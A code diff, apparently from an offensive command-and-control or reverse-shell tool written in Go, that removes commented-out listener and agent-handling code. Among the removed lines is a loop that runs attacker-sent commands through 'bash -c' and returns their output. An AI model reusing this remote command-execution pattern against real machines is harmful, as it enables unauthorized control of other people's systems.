@@ -134,20 +134,7 @@ func createNewListener() { //function to construct our listener
 	// Generate the listener using data from the user
 	// Create the TCP connection to your attackers Netcat
 	//var ipAndPortString string = data.GetIP() + ":" + data.GetPort()
-
 	generateListener()
-
-	//Accept commands from attacker
-	/*for {
-		attackerCommands, _ := bufio.NewReader(connection).ReadString('\n')
-		cmd := exec.Command("bash", "-c", attackerCommands)
-		if err != nil {
-			log.Fatalln(err)
-		}
-		out, _ := cmd.CombinedOutput()
-
-		connection.Write(out)
-	} */
 }
 
 func generateListener() {
@@ -160,35 +147,4 @@ func generateListener() {
 	}
 	defer listener.Close()
 	println("listener created")
-	/*for {
-		connection, err := listener.Accept()
-		if err != nil {
-			fmt.Println(err)
-			return
-		}
-		go handleConnection(connection) //the go command runs this function in the background
-		count++
-	} */
 }
-
-/*
-//function to handle and process incoming connections to the listener
-func handleConnection(connection net.Conn) {
-	fmt.Print("Successfully connected to agent\n")
-	for {
-		netData, err := bufio.NewReader(connection).ReadString('\n')
-		if err != nil {
-			fmt.Println(err)
-			return
-		}
-
-		temp := strings.TrimSpace(string(netData))
-		if temp == "STOP" { //If the user enters in STOP then kill the connection
-			break
-		}
-		fmt.Println(temp)
-		counter := strconv.Itoa(count) + "\n"
-		connection.Write([]byte(string(counter)))
-	}
-	connection.Close()
-} */
